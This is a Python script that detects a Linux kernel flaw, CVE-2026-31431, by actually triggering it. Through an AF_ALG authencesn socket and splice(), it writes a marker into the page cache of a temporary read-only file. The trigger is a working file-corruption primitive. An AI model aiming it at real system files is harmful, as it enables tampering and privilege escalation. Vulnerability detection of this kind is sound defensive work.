#!/usr/bin/env python3
# CVE-2026-31431 ("Copy Fail") vulnerability detector.

import errno
import os
import socket
import struct
import sys
import tempfile
import subprocess

AF_ALG                    = 38
SOL_ALG                   = 279
ALG_SET_KEY               = 1
ALG_SET_IV                = 2
ALG_SET_OP                = 3
ALG_SET_AEAD_ASSOCLEN     = 4
ALG_OP_DECRYPT            = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
PAGE     = 4096
ASSOCLEN = 8
CRYPTLEN = 16
TAGLEN   = 16
MARKER   = b"PWND"

def build_authenc_keyblob(authkey: bytes, enckey: bytes) -> bytes:
    rtattr   = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey

def precheck() -> str | None:
    if not os.path.exists("/proc/crypto"):
        return "/proc/crypto missing"
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", ALG_NAME))
        s.close()
    except OSError as e:
        return f"{ALG_NAME!r} cannot be instantiated ({e.strerror})"
    return None

def check_workaround() -> bool:
    """Checks if the algif_aead module is disabled via modprobe."""
    try:
        result = subprocess.check_output(["modprobe", "-c"], stderr=subprocess.DEVNULL).decode()
        for line in result.splitlines():
            if "algif_aead" in line and ("/bin/false" in line or "/bin/true" in line):
                return True
    except Exception:
        pass
    return False

def attempt_trigger(target_path: str) -> tuple[bytes, bytes]:
    sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!!\n" * (PAGE // 32))[:PAGE]
    with open(target_path, "wb") as f:
        f.write(sentinel)

    fd_target = os.open(target_path, os.O_RDONLY)
    os.read(fd_target, PAGE)
    os.lseek(fd_target, 0, os.SEEK_SET)

    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    master.bind(("aead", ALG_NAME))
    master.setsockopt(SOL_ALG, ALG_SET_KEY, build_authenc_keyblob(b"\x00" * 32, b"\x00" * 16))
    op, _ = master.accept()

    aad = b"\x00" * 4 + MARKER
    cmsg = [(SOL_ALG, ALG_SET_OP, struct.pack("I", ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, struct.pack("I", 16) + b"\x00" * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", ASSOCLEN))]
    op.sendmsg([aad], cmsg, socket.MSG_MORE)

    pr, pw = os.pipe()
    os.splice(fd_target, pw, CRYPTLEN + TAGLEN, offset_src=0)
    os.splice(pr, op.fileno(), CRYPTLEN + TAGLEN)
    
    try:
        op.recv(ASSOCLEN + CRYPTLEN + TAGLEN)
    except OSError:
        pass

    op.close(); master.close(); os.close(pr); os.close(pw)
    os.lseek(fd_target, 0, os.SEEK_SET)
    after = os.read(fd_target, PAGE)
    os.close(fd_target)
    return after, sentinel

def kernel_in_affected_line() -> bool:
    rel = os.uname().release.split("-")[0]
    parts = rel.split(".")
    try:
        major, minor = int(parts[0]), int(parts[1])
    except (ValueError, IndexError):
        return False
    return (major, minor) >= (6, 12)

def main() -> int:
    print(f"[*] CVE-2026-31431 detector initialized. Kernel={os.uname().release}")
    
    if check_workaround():
        print("[+] Workaround detected: The algif_aead module is disabled.")
        print("[+] The system is NOT vulnerable via this vector.")
        return 0

    if not kernel_in_affected_line():
        print(f"[i] Kernel {os.uname().release} predates the affected 6.12/6.17/6.18 lines.")

    reason = precheck()
    if reason:
        print(f"[+] Precondition not met ({reason}). NOT vulnerable.")
        return 0
    
    print(f"[+] AF_ALG + {ALG_NAME!r} loadable - precondition met.")

    tmp = tempfile.mkdtemp(prefix="copyfail-")
    target = os.path.join(tmp, "sentinel.bin")
    try:
        after, sentinel = attempt_trigger(target)
    finally:
        if os.path.exists(target): os.remove(target)
        if os.path.exists(tmp): os.rmdir(tmp)

    marker_off = after.find(MARKER)
    if marker_off >= 0 and sentinel.find(MARKER) < 0:
        print(f"[!] VULNERABLE to CVE-2026-31431 at offset {marker_off}.")
        return 2
        
    print("[+] Page cache intact. NOT vulnerable.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
